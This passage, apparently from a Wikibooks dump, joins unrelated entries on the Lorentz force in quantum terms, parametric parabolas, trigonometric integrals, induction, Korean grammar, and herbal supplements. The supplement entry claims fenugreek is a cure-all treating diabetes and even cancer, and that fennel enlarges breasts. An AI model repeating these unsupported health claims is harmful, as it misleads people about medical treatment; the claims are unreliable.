d\mathbf{r}\times {q\over c}\underbrace{\left({\partial\over\partial\mathbf{r}}\times \mathbf{A}\right)}_{\displaystyle\equiv\mathbf{B}}=
q\,\mathbf{E}\,dt+ d\mathbf{r}\times {q\over c}\,\mathbf{B}.
&lt;/math&gt;
As a classical object travels along the segment &lt;math&gt;d\mathcal{G}&lt;/math&gt; of a geodesic, its kinetic momentum changes by the sum of two terms, one linear in the temporal component&amp;nbsp;&lt;math&gt;dt&lt;/math&gt; of &lt;math&gt;d\mathcal{G}&lt;/math&gt; and one linear in the spatial component&amp;nbsp;&lt;math&gt;d\mathbf{r}.&lt;/math&gt; How much &lt;math&gt;dt&lt;/math&gt; contributes to the change of &lt;math&gt;\mathbf{p}_k&lt;/math&gt; depends on the ''electric field''&amp;nbsp;&lt;math&gt;\mathbf{E},&lt;/math&gt; and how much &lt;math&gt;d\mathbf{r}&lt;/math&gt; contributes depends on the ''magnetic field''&amp;nbsp;&lt;math&gt;\mathbf{B}.&lt;/math&gt; The last equation is usually written in the form
:&lt;math&gt;
{d\mathbf{p}_k\over dt}=q\,\mathbf{E}+{q\over c}\,\mathbf{v}\times\mathbf{B},
&lt;/math&gt;
called the ''Lorentz force law'', and accompanied by the following story: there is a physical entity known as the electromagnetic field, which is present everywhere, and which exerts on a charge&amp;nbsp;&lt;math&gt;q&lt;/math&gt; an electric force &lt;math&gt;q\mathbf{E}&lt;/math&gt; and a magnetic force &lt;math&gt;(q/c)\,\mathbf{v}\times\mathbf{B}.&lt;/math&gt;

(Note: This form of the Lorentz force law holds in the [[wikipedia:Centimeter gram second system of units|Gaussian system of units]]. In the [[wikipedia:International System of Units|MKSA system of units]] the &lt;math&gt;c&lt;/math&gt; is missing.)

&lt;br&gt;

===Whence the classical story?===
Imagine a small rectangle in spacetime with corners

:&lt;math&gt;A=(0,0,0,0),\;B=(dt,0,0,0),\;C=(0,dx,0,0),\;D=(dt,dx,0,0).&lt;/math&gt;

Let's calculate the electromagnetic contribution to the action of the path from &lt;math&gt;A&lt;/math&gt; to&amp;nbsp;&lt;math&gt;D&lt;/math&gt; via&amp;nbsp;&lt;math&gt;B&lt;/math&gt; for a unit charge (&lt;math&gt;q=1&lt;/math&gt;) in natural units (&amp;nbsp;&lt;math&gt;c=1&lt;/math&gt;&amp;nbsp;):
:&lt;math&gt;
S_{ABD}=-V(dt/2,0,0,0)\,dt+A_x(dt,dx/2,0,0)\,dx
&lt;/math&gt;
:::&lt;math&gt;
\quad=-V(dt/2,0,0,0)\,dt+\left[A_x(0,dx/2,0,0)+{\partial A_x\over\partial t}dt\right]dx.
&lt;/math&gt;
Next, the contribution to the action of the path from &lt;math&gt;A&lt;/math&gt; to&amp;nbsp;&lt;math&gt;D&lt;/math&gt; via&amp;nbsp;&lt;math&gt;C&lt;/math&gt;:

&lt;br&gt;
:&lt;math&gt;
S_{ACD}=A_x(0,dx/2,0,0)\,dx-V(dt/2,dx,0,0)\,dt
&lt;/math&gt;
:::&lt;math&gt;
=A_x(0,dx/2,0,0)\,dx-\left[V(dt/2,0,0,0)+{\partial V\over\partial x}dx\right]dt.
&lt;/math&gt;
Look at the difference:
:&lt;math&gt;
\Delta S=S_{ACD}-S_{ABD}=\left(-{\partial V\over\partial x}-{\partial A_x\over\partial t}\right)dt\,dx
=E_x\,dt\,dx.
&lt;/math&gt;
Alternatively, you may think of &lt;math&gt;\Delta S&lt;/math&gt; as the electromagnetic contribution to the action of the loop &lt;math&gt;A\rightarrow B \rightarrow D\rightarrow C\rightarrow A.&lt;/math&gt;

&lt;br&gt;[[image:dtdxdydz.png|440px]]

&lt;br&gt;Let's repeat the calculation for a small rectangle with corners

:&lt;math&gt;A=(0,0,0,0),\;B=(0,0,dy,0),\;C=(0,0,0,dz),\;D=(0,0,dy,dz).&lt;/math&gt;

&lt;br&gt;
:&lt;math&gt;
S_{ABD}=A_z(0,0,0,dz/2)\,dz+A_y(0,0,dy/2,dz)\,dy&lt;/math&gt;
:::&lt;math&gt;
=A_z(0,0,0,dz/2)\,dz+\left[A_y(0,0,dy/2,0)+{\partial A_y\over\partial z}dz\right]dy,
&lt;/math&gt;
:&lt;math&gt;
S_{ACD}=A_y(0,0,dy/2,0)\,dy+A_z(0,0,dy,dz/2)\,dz
&lt;/math&gt;
:::&lt;math&gt;
=A_y(0,0,dy/2,0)\,dy+\left[A_z(0,0,0,dz/2)+{\partial A_z\over\partial y}dy\right]dz,
&lt;/math&gt;
:&lt;math&gt;
\Delta S=S_{ACD}-S_{ABD}=
\left({\partial A_z\over\partial y}-{\partial A_y\over\partial z}\right)dy\,dz=B_x\,dy\,dz.
&lt;/math&gt;
Thus the electromagnetic contribution to the action of ''this'' loop equals the flux of&amp;nbsp;&lt;math&gt;\mathbf{B}&lt;/math&gt; through the loop.
&lt;p&gt;&lt;/p&gt;
Remembering (i)&amp;nbsp;[[This quantum world/Appendix/Fields|Stokes' theorem]] and (ii)&amp;nbsp;the [[This quantum world/Feynman route/From_quantum_to_classical#Lorentz force law|definition]] of &lt;math&gt;\mathbf{B}&lt;/math&gt; in terms of &lt;math&gt;\mathbf{A},&lt;/math&gt; we find that
:&lt;math&gt;
\oint_{\partial\Sigma}\mathbf{A}\cdot d\mathbf{r}=\int_\Sigma\hbox{curl}\,\mathbf{A}\cdot d\mathbf{\Sigma}=\int_\Sigma\mathbf{B}\cdot d\mathbf{\Sigma}.
&lt;/math&gt;
In (other) words, the magnetic flux through a loop &lt;math&gt;\partial\Sigma&lt;/math&gt; (or through any surface &lt;math&gt;\Sigma&lt;/math&gt; bounded by&amp;nbsp;&lt;math&gt;\partial\Sigma&lt;/math&gt;&amp;nbsp;) equals the circulation of&amp;nbsp;&lt;math&gt;\mathbf{A}&lt;/math&gt; around the loop (or around any surface bounded by the loop).

The effect of a circulation &lt;math&gt;\oint_{\partial\Sigma}\mathbf{A}\cdot d\mathbf{r}&lt;/math&gt; around the ''finite'' rectangle &lt;math&gt;A\rightarrow B\rightarrow D\rightarrow C\rightarrow A&lt;/math&gt; is to increase (or decrease) the action associated with the segment &lt;math&gt;A\rightarrow B\rightarrow D&lt;/math&gt; relative to the action associated with the segment &lt;math&gt;A\rightarrow C\rightarrow D.&lt;/math&gt; If the actions of the two segments are equal, then we can expect the path of least action from &lt;math&gt;A&lt;/math&gt; to&amp;nbsp;&lt;math&gt;D&lt;/math&gt; to be a straight line. If one segment has a greater  action than the other, then we can expect the path of least action from &lt;math&gt;A&lt;/math&gt; to&amp;nbsp;&lt;math&gt;D&lt;/math&gt; to curve away from the segment with the larger action.

&lt;br&gt;[[image:Deltxyz.png|440px]]

&lt;br&gt;Compare this with the classical story, which explains the curvature of the path of a charged particle in a magnetic field by invoking [[This quantum world/Feynman route/From_quantum_to_classical#Lorentz force law|a force that acts at right angles to both the magnetic field and the particle's direction of motion]]. The quantum-mechanical treatment of the same effect offers no such explanation. ''Quantum mechanics invokes no mechanism of any kind.'' It simply tells us that for a sufficiently massive charge traveling from &lt;math&gt;A&lt;/math&gt; to&amp;nbsp;&lt;math&gt;D,&lt;/math&gt; the probability of finding that it has done so within any bundle of paths ''not'' containing the action-geodesic connecting &lt;math&gt;A&lt;/math&gt; with&amp;nbsp;&lt;math&gt;D,&lt;/math&gt; is virtually&amp;nbsp;0.

Much the same goes for the classical story according to which the curvature of the path of a charged particle in a ''spacetime'' plane is due to a force that acts in the direction of the electric field. (Observe that curvature in a spacetime plane is equivalent to acceleration or deceleration. In particular, curvature in a spacetime plane containing the &lt;math&gt;x&lt;/math&gt;&amp;nbsp;axis is equivalent to acceleration in a direction parallel to the &lt;math&gt;x&lt;/math&gt;&amp;nbsp;axis.) In this case the corresponding circulation is that of the 4-vector potential &lt;math&gt;(cV,\mathbf{A})&lt;/math&gt; around a spacetime loop.

      <comment>/* Derivation of equations of the tangent and the normal */</comment>
      <text xml:space="preserve">The parametric form of a curve is an algebraic representation which expresses the co-ordinates of each point on the curve as a function of an introduced  ''parameter,'' most frequently &lt;math&gt;t&lt;/math&gt;. This contrasts with Cartesian form in that parametric equations do not describe an explicit relation between &lt;math&gt;x&lt;/math&gt; and &lt;math&gt;y&lt;/math&gt;. This relation must be derived in order to convert from parametric to Cartesian form. 

In 3-unit, parametrics focuses on a parametric representation of the quadratic, moving from parametric to Cartesian form and vice-versa, and manipulating geometrical aspects of the quadratic with parametrics. Recognition of other parametric forms is also useful, and more forms are introduced and dealt with in the 4-unit topic, [[../../../4-Unit/Conics|conics]].

== Reasons for using the parametric form ==
In specific situations (in the school syllabus, primarily [[w:Conic section|Conic sections]]), the parametric representation can be useful because:
*points on the curve are represented by a single number, not two, simplifying algebra;
*some elegant results are possible; for instance, in the standard paramaterisation of the quadratic, the gradient is equal to the parameter, &lt;math&gt;t&lt;/math&gt;;
*some curves, which cannot be expressed in functional form (for example, the circle, which is neither a function of &lt;math&gt;x&lt;/math&gt; nor of &lt;math&gt;y&lt;/math&gt;) can be conveniently expressed in parametric form;
*intuitively, it allows for an easier way to find points on the graph: you can sub in any value for the parameter and instantly find a point, whereas a relational form is not deterministic in the same way.

Furthermore, the parametric form occurs in certain natural phenomena. For instance, using the equations of motion, a thrown ball's location at any time can be calculated using the laws of projectile motion. This is implicitly paramaterising the ball's path by time; to find the shape of the ball's path, (which we know is a parabola) we must use parametrics, to eliminate time, &lt;math&gt;t&lt;/math&gt;, from the equations.

== Converting parametric to Cartesian forms ==
One of the simplest parametric forms is the line:
:&lt;math&gt;\begin{align}
x &amp; = t \\
y &amp; = t\end{align}&lt;/math&gt;
By inspection, it is obvious that this describes the line &lt;math&gt;y = x&lt;/math&gt;. However, what is the formalised approach for doing this?

We are looking for some relation between &lt;math&gt;x&lt;/math&gt; and &lt;math&gt;y&lt;/math&gt; which has no &lt;math&gt;t&lt;/math&gt; in it. In other words, we want to ''eliminate'' &lt;math&gt;t&lt;/math&gt; from the equations. In the above example, we did this by equating the first and second equations, eliminating &lt;math&gt;t&lt;/math&gt;.

==== Another example: ====
:&lt;math&gt;\begin{align}x &amp; = 3t + 1 \\
y &amp; = 9t^2 - 1\end{align}&lt;/math&gt;
We solve equation 1 for t, and substitute into equation 2:
:&lt;math&gt;
\begin{align}
    x &amp; = 3t + 1 \\
    t &amp; = \frac{x - 1}{3}
\end{align}
&lt;/math&gt;
Sub into equation 2:
:&lt;math&gt;
\begin{align}
    y &amp; = 9t^2 - 1 \\
     &amp; = 9\left(\frac{x - 1}{3}\right)^2 - 1 \\
     &amp; = x^2 - 2x + 1 - 1 \\
     &amp; = x^2 - 2x
\end{align}
&lt;/math&gt;
Here we have a Cartesian form, as required.

== Three standard parametric forms ==
These parametric forms occur frequently, and should be recognised by 3- and 4-unit students.
=== Parabola ===
The standard paramaterisation of the parabola describes one with focal length &lt;math&gt;a\,&lt;/math&gt; and with its vertex at the origin. In Cartesian form, this is given as
:&lt;math&gt;x^2 = 4ay\,&lt;/math&gt;
In parametric form, this is given as
:&lt;math&gt;\begin{align}x &amp; = 2at \\
y &amp; = at^2\end{align}&lt;/math&gt;

Eliminating &lt;math&gt;t\,&lt;/math&gt; allows us to verify that this is equivalent to the Cartesian form:
:&lt;math&gt;
\begin{align}
    x   &amp; = 2at \\
    x^2 &amp; = 4a^2t^2 \\
        &amp; = 4a (at^2) \\
        &amp; = 4ay
\end{align}
&lt;/math&gt;
as required.

=== Circle ===
[[Image:Parametric circle.png|thumb|288px|Diagram of a circle, indicating the geometrical meaning of the parameter]]
The circle with radius &lt;math&gt;r\,&lt;/math&gt; and center at the origin can be written in Cartesian form as
:&lt;math&gt;x^2 + y^2 = r^2\,&lt;/math&gt;
Introducing the parameter, &lt;math&gt;\theta\,&lt;/math&gt;, this is:
:&lt;math&gt;\begin{align}x &amp;= r\cos\theta \\
y &amp;= r\sin\theta\end{align}&lt;/math&gt;
We convert to Cartesian as follows:
:&lt;math&gt;
\begin{align}
    x^2       &amp; = r^2\cos^2\theta \\
    y^2       &amp; = r^2\sin^2\theta \\
    x^2 + y^2 &amp; = r^2\cos^2\theta + r^2\sin^2\theta \\ 
              &amp; = r^2(\cos^2\theta + \sin^2\theta)
\end{align}
&lt;/math&gt;
Recalling the trig identity,
:&lt;math&gt;\sin^2\theta + \cos^2\theta = 1\,&lt;/math&gt;
we conclude
:&lt;math&gt;x^2 + y^2 = r^2\,&lt;/math&gt;
as required.

==== Geometrical interpretation ====
Unlike most parametrics, the conic sections are paramaterised by &lt;math&gt;\theta\,&lt;/math&gt; instead of &lt;math&gt;t\,&lt;/math&gt;. For the circle, this implies a geometric representation: &lt;math&gt;\theta\,&lt;/math&gt; represents the angle the point makes with the &lt;math&gt;x&lt;/math&gt; axis.

=== Ellipse ===
Conceptually, an ellipse is just a 'squished' circle. The parametric form makes this clear:
:&lt;math&gt;\begin{align}x &amp;= a\cos\theta\\
y &amp;= b\sin\theta\end{align}&lt;/math&gt;
The cos and sin are still there, but they are now multiplied by ''different'' constants so that the &lt;math&gt;x&lt;/math&gt; and &lt;math&gt;y&lt;/math&gt; components are stretched differently. We can turn this into the parametric form in a similar fashion to the circle:
:&lt;math&gt;
\begin{align}
    x^2                               &amp; = a^2\cos^2\theta \\
    y^2                               &amp; = b^2\sin^2\theta \\
    \frac{x^2}{a^2} + \frac{y^2}{b^2} &amp; = \cos^2\theta + \sin^2\theta \\ 
                                      &amp; = 1
\end{align}
&lt;/math&gt;
which is the standard form of an ellipse, with &lt;math&gt;x&lt;/math&gt; and &lt;math&gt;y&lt;/math&gt; intercepts at &lt;math&gt;\pm a\,&lt;/math&gt; and &lt;math&gt;\pm b\,&lt;/math&gt;, respectively.

== Properties of the parabola ==
3-Unit students are expected to remember the parametric description of a parabola (&lt;math&gt;x = 2at, y = at^2&lt;/math&gt;). They are also expected to know (and/or be able to quickly derive) the equations of the tangent and the normal to the parabola at the point &lt;math&gt;t&lt;/math&gt; and at the point &lt;math&gt;(x_1,y_1)&lt;/math&gt;.

=== Derivation of equations of the tangent and the normal ===
Differentiating each parametric equation with respect to &lt;math&gt;t\,&lt;/math&gt;,
:&lt;math&gt;\begin{align}
\frac{dy}{dt} &amp; = 2at \\
\frac{dx}{dt} &amp; = 2a
\end{align}&lt;/math&gt;
Then the gradient &lt;math&gt;\tfrac{dy}{dx}&lt;/math&gt; can be obtained by dividing &lt;math&gt;\tfrac{dy}{dt}&lt;/math&gt; by &lt;math&gt;\tfrac{dx}{dt}&lt;/math&gt; (this is the chain rule):
:&lt;math&gt;\begin{align}
\frac{dy}{dx} &amp; = \frac{dy}{dt} \frac{dt}{dx} \\
              &amp; = \frac{2at}{1} \frac{1}{2a} \\
              &amp; = t
\end{align}&lt;/math&gt;

Note that this result could have been derived without the chain rule, by taking the derivative of the Cartesian form (with respect to &lt;math&gt;x\,&lt;/math&gt;) and solving for &lt;math&gt;t\,&lt;/math&gt;. However, the above derivation is faster and more elegant.
==== The equation of the tangent at ''P'' ====
[[Image:Parabola tangent normal.png|thumb|288px|Diagram of a parabola, showing the normal and tangent at a point P]]
The gradient of the tangent at a point &lt;math&gt;P(2at,at^2)&lt;/math&gt; then is &lt;math&gt;t&lt;/math&gt;. The equation of the tangent at &lt;math&gt;P&lt;/math&gt; is:
:Using the point-gradient formula &lt;math&gt;y-y_1=m(x-x_1)\,&lt;/math&gt;, the equation is:
::&lt;math&gt;\begin{align}
y-at^2 &amp; = t(x-2at) \\
       &amp; = tx - 2at^2 \\
y+at^2 &amp; = tx \\
y-tx+at^2 &amp; = 0 &amp; \mbox{ or } y = xt - at^2
\end{align}&lt;/math&gt;

==== The equation of the normal at ''P'' ====

The gradient of the normal at the point &lt;math&gt;P&lt;/math&gt; is &lt;math&gt;\tfrac{-1}{t}&lt;/math&gt; (since two perpendicular lines with gradients &lt;math&gt;m_1\,&lt;/math&gt; and &lt;math&gt;m_2\,&lt;/math&gt; must have &lt;math&gt;m_1 m_2 = -1\,&lt;/math&gt;). Similarly to the derivation of the equation of the tangent:
:&lt;math&gt;\begin{align}
y - at^2 &amp; = \tfrac{-1}{t}(x - 2at) \\
         &amp; = \tfrac{-x}{t} + \tfrac{2at}{t} \\
yt - at^3 &amp; = -x + 2at \\
yt + x - at(t^2 + 2) &amp; = 0 &amp; \mbox{or } x + ty = 2at + at^3
\end{align}&lt;/math&gt;

=== Chords of a parabola ===
[[Image:Parabola chord.png|thumb|288px|Diagram of a parabola, a chord PQ]]

Suppose that &lt;math&gt;P(2ap,ap^2)&lt;/math&gt; and &lt;math&gt;Q(2aq,aq^2)&lt;/math&gt; are two distinct points on the parabola &lt;math&gt;x^2=4ay&lt;/math&gt;. We can derive the equation for the line &lt;math&gt;PQ&lt;/math&gt; by finding the gradient and using the point-gradient formula:
:&lt;math&gt;\begin{align}
m &amp;= \frac{ap^2-aq^2}{2ap-2aq} \\
  &amp;= \frac{a(p-q)(p+q)}{2a(p-q)} \\
  &amp;= \tfrac{1}{2}(p+q)
\end{align}&lt;/math&gt;
so the chord is
:&lt;math&gt;\begin{align}
y - ap^2 &amp;= \tfrac{1}{2}(p+q)(x-2ap) \\
         &amp;= \tfrac{1}{2}(p+q)x - ap^2 - apq \\
       y &amp;= \tfrac{1}{2}(p+q)x - apq
\end{align}&lt;/math&gt;

=== Intersection of tangents ===
The points &lt;math&gt;P(2ap,ap^2)&lt;/math&gt; and &lt;math&gt;Q(2aq,aq^2)&lt;/math&gt; lie on the parabola &lt;math&gt;x^2=4ay&lt;/math&gt;. The intersection of the tangents at &lt;math&gt;P&lt;/math&gt; and &lt;math&gt;Q&lt;/math&gt; can be found in terms of &lt;math&gt;p&lt;/math&gt; and &lt;math&gt;q&lt;/math&gt;:
:The tangents are:
::&lt;math&gt;\begin{align}
y &amp; = px - ap^2 \\
y &amp; = qx - aq^2
\end{align}&lt;/math&gt;
:Subtracting these,
::&lt;math&gt;\begin{align}
y - y &amp; = px - ap^2 - (qx - aq^2) \\
0 &amp; = px - ap^2 - qx + aq^2 \\
0 &amp; = px - qx + aq^2 - ap^2 \\
x(p-q) &amp; = a(p^2 - q^2) \\
x(p-q) &amp; = a(p+q)(p-q) \\
x &amp; = a(p+q)
\end{align}&lt;/math&gt;
:Substituting into the original tangent formula,
::&lt;math&gt;\begin{align}
y &amp; = p(a(p+q)) - ap^2 \\
  &amp; = ap(p+q) - ap^2 \\
  &amp; = ap^2 + apq - ap^2 \\
  &amp; = apq
\end{align}&lt;/math&gt;
So the point of intersection is described by &lt;math&gt;T(a(p+q),apq)\,&lt;/math&gt;.

      <text xml:space="preserve">==[[Fenugreek]]==
Fenugreek, its formal name being Trigonella foenum-graecum, which translates to three angled Greek hay. Fenugreek is native to the Europe and Asia areas and was commonly used by the Greeks, Romans, and Egyptians. It is now commonly cultivated in India, Africa, Egypt, Morocco, and a little in England. This seed could easily be considered a cure-all due to the multitude of ills that it can prevent or cure whether externally or internally. Externally the paste of fenugreek seed, which is made by mixing 1oz of fenugreek with 1 pint of water, can be used to treat abscesses, boils, carbuncles, and other skin issues of that ilk. Internally fenugreek seed has been known to treat bronchitis, fevers, sore throats, swollen glands, diabetes, ulcers, and even cancer. One will see fenugreek more commonly used as a digestive aid, as a way to promote lactation, and as an aphrodisiac. It has also been found to lower blood glucose levels in lab tests done with animals. 
Fenugreek can easily be taken through out the day due to the fact that the crushed seed has a maple-like flavor that can be slipped into one’s favorite cookie recipe or the jelly of their peanut butter and jelly sandwich. But be careful how much is consumed. Fenugreek is used as a laxative in some cases and shouldn’t be taken in too large of amounts right away. So, when using fenugreek seed one should start with a small amount and logically progress from there until they find the amount that is right for their body’s comfort level.

==[[Fennel]]==
Fennel, its formal name is Foeniculum Vulgare. Fennel is native to southern Europe, namely the Mediterranean. Fennel is used for infants and small children in order to cure colic, croup or gas. It is also used for congestion, bronchitis, and asthma. It can be commonly found as an ingredient in cold medicines. For a woman who is nursing it can be used to increase the flow of breast milk, for woman in general it can be used to increase breast size. Also, commonly used for better breath. Much cheaper than breath mints and has many more health benefits.

==[[Omega-3 Fatty Acids]]==
Omega-3 Fatty Acids are a natural supplement commonly found in fish. People are supposed to have anywhere from 0.5 to 1.8 grams per day either from fish or from a supplement, although it is better for one’s body to take Omega-3 through food. Omega-3’s can prevent sudden cardiovascular issues such as non-fatal heart attacks, non-fatal strokes, and death. It can also prevent health problems such as atherosclerosis, which is a hardening of arteries that can lead to serious health problems. Omega-3’s can slightly lower blood pressure, but they just generally prevent cardiovascular disease.</text>

      <comment>/* Finding the primitive */</comment>
      <text xml:space="preserve">The integration of these functions can be performed by the substitution of &lt;math&gt;\sin^2\alpha&lt;/math&gt; or &lt;math&gt;\cos^2\alpha&lt;/math&gt; by a function in terms of &lt;math&gt;\cos2\alpha&lt;/math&gt; respectively.

== Deriving the substituted functions ==
By the double-angle formula, &lt;math&gt;\left.\cos 2\alpha = 2\cos^2 \alpha - 1\right.&lt;/math&gt;. Rearranging to make &lt;math&gt;\cos^2\alpha&lt;/math&gt; the subject, &lt;math&gt;\cos^2\alpha = \tfrac{1}{2} + \tfrac{1}{2}\cos2\alpha&lt;/math&gt;.

We know by the Pythagorean identity &lt;math&gt;\left.\sin^2\theta + \cos^2\theta = 1\right.&lt;/math&gt; that &lt;math&gt;\left.\cos^2\alpha = 1 - \sin^2\alpha\right.&lt;/math&gt;, so &lt;math&gt;1 - \sin^2\alpha = \tfrac{1}{2} + \tfrac{1}{2}\cos2\alpha&lt;/math&gt;. Rearranging, &lt;math&gt;\sin^2\alpha = \tfrac{1}{2} - \tfrac{1}{2}\cos2\alpha&lt;/math&gt;.

== Finding the primitive ==
By substituting &lt;math&gt;\sin^2\alpha\,&lt;/math&gt; for &lt;math&gt;\tfrac{1}{2} - \tfrac{1}{2}\cos2\alpha&lt;/math&gt;, &lt;math&gt;\int \sin^2 \alpha d\alpha = \int \tfrac{1}{2} - \tfrac{1}{2}\cos2\alpha d\alpha&lt;/math&gt;. Similarly for &lt;math&gt;\cos^2\alpha \,&lt;/math&gt;,

&lt;math&gt;\int \cos^2 \alpha \, d\alpha = \int \tfrac{1}{2} + \tfrac{1}{2}\cos2\alpha \, d\alpha&lt;/math&gt;

These can be integrated by using the primitives of cosine and sine

&lt;math&gt; \int \cos \alpha d\alpha = \sin \alpha + c&lt;/math&gt;

&lt;math&gt; \int \sin \alpha d\alpha = - \cos \alpha + c&lt;/math&gt;

For ''cos&lt;sup&gt;2&lt;/sup&gt; α''

&lt;math&gt;\int \cos^2 \alpha \, d\alpha = \int \tfrac{1}{2} + \tfrac{1}{2}\cos2\alpha \, d\alpha&lt;/math&gt;

&lt;math&gt;\int \tfrac{1}{2} + \tfrac{1}{2}\cos2\alpha \, d\alpha = \tfrac{1}{2} \alpha + \tfrac{1}{4} \sin2\alpha + c &lt;/math&gt;

&lt;math&gt;\int \cos^2 \alpha \, d\alpha = \tfrac{1}{2} \alpha + \tfrac{1}{4} \sin2\alpha + c &lt;/math&gt;

For ''sin&lt;sup&gt;2&lt;/sup&gt; α''


&lt;math&gt;\int \sin^2 \alpha \, d\alpha = \int \tfrac{1}{2} - \tfrac{1}{2}\cos2\alpha \, d\alpha&lt;/math&gt;

&lt;math&gt;\int \tfrac{1}{2} - \tfrac{1}{2}\cos2\alpha \, d\alpha = \tfrac{1}{2} \alpha - \tfrac{1}{4} \sin2\alpha + c &lt;/math&gt;

&lt;math&gt;\int \sin^2 \alpha \, d\alpha = \tfrac{1}{2} \alpha - \tfrac{1}{4} \sin2\alpha + c &lt;/math&gt;

      <text xml:space="preserve">Induction is a form of proof useful for proving equations involving non-closed expressions (i.e., expressions with &lt;math&gt;n&lt;/math&gt; terms; sequences).

== Explanation ==
Induction involves first proving that the equation is true for &lt;math&gt;n = 1&lt;/math&gt;, then proving true for &lt;math&gt;n = k + 1&lt;/math&gt; (assuming for the purpose of the proof that the equation holds true for &lt;math&gt;n = k&lt;/math&gt;). Since it is true for &lt;math&gt;n = k&lt;/math&gt; and true for &lt;math&gt;n = k+1&lt;/math&gt;, and also true for &lt;math&gt;n = 1&lt;/math&gt;, it is true for &lt;math&gt;n = 2&lt;/math&gt;. It follows that it is true for all positive integers &lt;math&gt;n&lt;/math&gt;.

=== Examples ===
==== Proving the formula for the sum of a series ====
Q: Prove by mathematical induction that for all integers &lt;math&gt;n \ge 1&lt;/math&gt;,
: &lt;math&gt;1^3 + 2^3 + 3^3 + 4^3 + \cdots + n^3 =  (1+2+3+....n)^2&lt;/math&gt;

A:
&lt;ol&gt;
&lt;li&gt;When &lt;math&gt;n = 1&lt;/math&gt;, &lt;math&gt;1^3 = 1 = \tfrac{1}{4} (1)^2((1)+1)^2 = \tfrac{1}{4}(4) = 1&lt;/math&gt;, so it is true for &lt;math&gt;n = 1&lt;/math&gt;&lt;/li&gt;
&lt;li&gt;Suppose that the statement is true for &lt;math&gt;k, k \in \mathbb{N}&lt;/math&gt;. That is, suppose that &lt;math&gt;1^3 + 2^3 + 3^3 + 4^3 + \cdots + k^3 = \tfrac{1}{4} k^2 (k+1)^2&lt;/math&gt;. This is sometimes called the ''induction hypothesis''.&lt;/li&gt;
&lt;li&gt;Then prove the statement for &lt;math&gt;n = k+1&lt;/math&gt; (that is, prove that &lt;math&gt;1^3 + 2^3 + 3^3 + \cdots + (k+1)^3 = \tfrac{1}{4} (k+1)^2(k+2)^2&lt;/math&gt;:
:&lt;math&gt;
\begin{align}
  \mbox{LHS} &amp; = 1^3 + 2^3 + 3^3 + 4+3 + \cdots + k^3 + (k+1)^3 \\
             &amp; = \tfrac{1}{4} k^2 (k+1)^2 + (k+1)^3                &amp; \mbox{ (by the induction hypothesis)} \\
             &amp; = \tfrac{1}{4}(k+1)^2(k^2 + 4(k+1)) \\
             &amp; = \tfrac{1}{4}(k+1)^2(k^2 + 4k + 4) \\
             &amp; = \tfrac{1}{4}(k+1)^2(k+2)^2 \\
             &amp; = \mbox{RHS}
\end{align}
&lt;/math&gt;
&lt;/li&gt;
&lt;li&gt;It follows from parts 1 and 2 by mathematical induction that the statement is true for all positive integers &lt;math&gt;n&lt;/math&gt;.&lt;/li&gt;
&lt;/ol&gt;

      <comment>/* Superlatives */</comment>
      <text xml:space="preserve">{{:Korean/Navigation panel|Grammar}}

=== Introduction ===
This chapter talks about how to do comparisons in the Korean language and express superlatives.  For those unfamiliar with the grammar terms, a superlative term basically expresses whether something is the best, the biggest, the tallest, etc.

=== Superlatives ===
To express a superlative in Korean, a speaker can use either 가장 or 제일 followed by the verb. One example is telling someone what your favorite movie is. Thus, to say that your favorite movie is the Matrix, you can say 나는 Matrix를 제일 좋아해요.  This would literally translate to 'I like Matrix the most.'

=== Comparatives ===
To do a comparison in Korean, a speaker can use '보다 (더)' followed by a verb.  Here are some examples.
*  나는 차보다 커피를 즐겨요.  I like coffee better than tea.
*  나는 수학을 역사보다 좋아해요.  I like math better than history.

If there are 2 objects being compared, the object that that is being compared against is placed right before the 보다.  So in the examples above, the Korean word for tea, 차, is placed right before the 보다 and the Korean word for history, 역사, is put right before the 보다.

== Degree of adjectives ==
To form varying degrees of adjectives, prefix an adjective with the adverbs [[wikt:매우|매우]] or [[wikt:아주|아주]]:
* [[wikt:비싸다|비싸다]]: (to be) expensive
* 매우 비싸다: (to be) very expensive
* 아주 비싸다: (to be) extremely expensive

      <text xml:space="preserve">{{:Korean/Navigation panel|II}}

=== Vocabulary ===
* 축구             soccer
* 농구             basketball
* 배구             volleyball
* 야구             baseball
* 테니스          tennis
* 수영             swimming
* 골프             golf
* 스키             skiing

''&lt;u&gt;'''&lt;big&gt;Using Common form - 요&lt;/big&gt;'''&lt;/u&gt;''

Here we will be using the common level of politeness used in Korean which includes - 요&lt;br/&gt;
This is one of the most common levels of politeness used in Korea which is quite universal if you are speaking to people who you are meeting for the first time (NOT if they are older than you or in a higher position) and so you should become familiar with it before learning the casual form - 야 and the honorific form - 습니다, 습니까.&lt;br/&gt;&lt;br/&gt;

The common level is easier to conjugate into because you use the same endings if you were to form a question. All you have to do to let the person/persons know that you are asking a question is raise your voice! This only works in the common and casual form of conjugation and this is why it is so commonly used in Korean everyday life. However, do not make the mistake of using this level of politeness to older people or people with higher authority than you because you could get into a '''lot''' of trouble!&lt;br/&gt;

''&lt;u&gt;'''&lt;big&gt;Conversation&lt;/big&gt;'''&lt;/u&gt;''&lt;br/&gt;
You can see the vocabulary included above about different types of sports! It just so happens that 가영 and 수연 are having a conversation about which sports they like and which they don't!&lt;br/&gt;

(가영)=             '''안녕하세요, 수연씨!'''
&lt;br /&gt;
(수연)=             '''네, 안녕하세요. 가영씨, 내일 스키를 갈거예요?'''
&lt;br /&gt;
(가영)=             '''아니요. 저는 스키를 싫어해요. '''
&lt;br /&gt;
(수연)= '''아, 그래요? 저도요.'''
&lt;br /&gt;
(가영)= '''하지만 저는 농구를 좋아해요.'''
&lt;br /&gt;
(수연)= '''저도요. 저는 학교에서 농구를 하는 것을 좋아해요.'''
&lt;br /&gt;
(가영)= '''맞아요. 저도 그래요.'''


''&lt;u&gt;'''&lt;big&gt;Explanation&lt;/big&gt;'''&lt;/u&gt;''

'''&lt;big&gt;안녕하세요, 수연씨!&lt;/big&gt;'''
&lt;br /&gt;
There's nothing new here if you have been through all of the other beginner lessons.
&lt;br /&gt;
                 &lt;big&gt;안녕하세요&lt;/big&gt;
&lt;br /&gt;
                  &lt;big&gt;Hello&lt;/big&gt;
&lt;br /&gt;
We know that this phrase means hello and there isn't so much of a difference here between the honorific form of saying it -안녕하십니까
Later on, you should learn about verb stems(VS) if you haven't already and these verb stems are present throughout all of the conjugations in Korean (unless they're irregular)&lt;br /&gt;
&lt;u&gt;'''Verb Stems'''&lt;/u&gt;&lt;br /&gt;

